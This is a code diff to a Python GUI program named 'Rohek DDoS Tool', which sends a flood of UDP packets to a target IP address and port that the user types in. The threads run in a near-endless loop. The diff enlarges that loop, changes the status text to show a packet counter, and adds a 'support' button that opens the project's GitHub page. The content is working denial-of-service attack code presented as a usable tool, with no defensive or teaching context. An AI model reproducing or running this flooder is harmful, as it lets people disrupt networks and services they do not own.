@@ -17,7 +17,7 @@ def attack(ip, port):
             ddos.sendto(message.encode(), (ip_addr, port))
             with print_lock:
                 packet_count += 1
-                print(f"Sent packet to {ip}:{port}")
+                print(f'Packet {packet_count} to {ip}:{port} ')
         except socket.error as msg:
             with print_lock:
                 print("|[Connection Failed] |")
@@ -26,13 +26,17 @@ def attack(ip, port):
 def start_attack():
     ip = ip_entry.get()
     port = int(port_entry.get())
-    for i in range(1000000000):
+    for i in range(1000000000000):
         t = threading.Thread(target=attack, args=(ip, port))
-        status_label.config(text="Attacking...")
+        status_label.config(text=f'Packet {packet_count} to {ip}:{port} ')
         t.daemon = True
         t.start()
         t.join()
         i = i + 1
+
+def supporthelp():
+    os.system('start https://github.com/Polokalap/Rohek')
+    print("Opened Github sdfj")
 
 root = tk.Tk()
 root.title("Rohek DDoS Tool By Polokalap")
@@ -53,7 +57,10 @@ port_entry.grid(row=1, column=1, padx=10, pady=5)
 attack_button = tk.Button(root, text="Attack", command=start_attack)
 attack_button.grid(row=2, columnspan=2, padx=10, pady=10)
 
+support_button = tk.Button(root, text="support", command=supporthelp)
+support_button.grid(row=3, columnspan=2, column=5, padx=10, pady=10)
+
 status_label = tk.Label(root, text="")
-status_label.grid(row=3, columnspan=2)
+status_label.grid(row=5, column=3, padx=10, pady=5)
 
 root.mainloop()
